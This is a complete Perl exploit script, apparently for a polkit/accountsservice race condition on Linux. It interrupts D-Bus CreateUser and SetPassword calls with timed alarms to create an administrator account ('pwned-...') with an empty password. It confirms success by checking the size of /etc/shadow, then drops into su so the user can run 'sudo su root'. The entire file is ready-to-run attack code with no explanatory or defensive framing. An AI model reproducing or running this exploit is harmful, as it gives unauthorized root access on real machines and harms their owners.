#!/usr/bin/perl

use strict;
use warnings;
use Net::DBus;
use Net::DBus::Reactor;
use POSIX qw(:sys_wait_h);
use Time::HiRes qw(sleep);
use Fcntl qw(:mode);
use File::stat;

my $DEST = "org.freedesktop.Accounts";
my $PATH = "/org/freedesktop/Accounts";
my $INTERFACE = "org.freedesktop.Accounts";
my $METHOD = "CreateUser";
my $INTERFACE2 = "org.freedesktop.Accounts.User";
my $METHOD2 = "SetPassword";
my $SHADOW_FILE = "/etc/shadow";

sub create_user {
    my ($user, $delay) = @_;
    
    my $pid = fork();
    if ($pid == 0) { # Child process
        my $bus = Net::DBus->system();
        my $service = $bus->get_service($DEST);
        my $object = $service->get_object($PATH, $INTERFACE);
        
        # Setup timeout using alarm
        local $SIG{ALRM} = sub { exit(0) };
        alarm($delay / 1000) if $delay > 0;
        
        eval {
            $object->$METHOD($user, $user, 1); # 1 = Administrator user
        };
        exit(0);
    }
    return $pid;
}

sub set_password {
    my ($password, $uid, $delay) = @_;
    
    my $pid = fork();
    if ($pid == 0) { # Child process
        my $path2 = "/org/freedesktop/Accounts/User$uid";
        
        my $bus = Net::DBus->system();
        my $service = $bus->get_service($DEST);
        my $object = $service->get_object($path2, $INTERFACE2);
        
        # Setup timeout using alarm
        local $SIG{ALRM} = sub { exit(0) };
        alarm($delay / 1000) if $delay > 0;
        
        eval {
            $object->$METHOD2($password, "");
        };
        exit(0);
    }
    return $pid;
}

sub is_empty_password_set {
    my ($shadow_size_ref) = @_;
    
    my $st = stat($SHADOW_FILE);
    if (!$st) {
        print "[!] Error checking shadow file size!\n";
        return 0;
    }
    
    if ($$shadow_size_ref == 0) {
        $$shadow_size_ref = $st->size;
        return 0;
    }
    
    return ($st->size == $$shadow_size_ref - 1);
}

sub launch_shell {
    my ($user) = @_;
    
    $ENV{'USER'} = $user;
    $ENV{'HOME'} = "/home/$user" if -d "/home/$user";
    
    exec('/usr/bin/su', '-', $user) or die "Cannot execute su: $!";
}

# Main program
my $user = sprintf("pwned-%d", time());
print "[*] creating \"$user\" user ...\n";

my $uid = 1337;
my $delay = 0;
my $max_delay = 0;
my $shadow_size = 0;
my $empty_password_set = 0;

# Try to create user
my $passwd_user;
do {
    my $pid = create_user($user, $delay);
    waitpid($pid, 0);
    
    $passwd_user = getpwnam($user);
    $delay++ unless $passwd_user;
} while (!$passwd_user && $delay < 1000);

if (!$passwd_user) {
    print "[!] Exploit didn't work, user not created, aborting ...\n";
    exit(1);
} else {
    $uid = $passwd_user->uid;
    $max_delay = $delay + 1000;
    $delay = 0;
}

print "[!] User has been created!\n";
print "[*] user: $user, uid: $uid\n";
print "[*] Setting empty password for \"$user\" user..\n";

sleep(2); # Let accounts service recognize the new account

# Try to set empty password
do {
    my $pid = set_password("", $uid, $delay);
    waitpid($pid, 0);
    
    $delay++;
    $empty_password_set = is_empty_password_set(\$shadow_size);
} while (!$empty_password_set && $delay < $max_delay);

if (!$empty_password_set) {
    printf "[!] Couldn't set empty password for \"%s\" user, try again!\n", $user;
    exit(1);
}

printf "[*] Empty password has been set for \"%s\" user!\n", $user;
printf "[!] Run: \"sudo su root\" as \"%s\" user to get root\n", $user;

launch_shell($user);
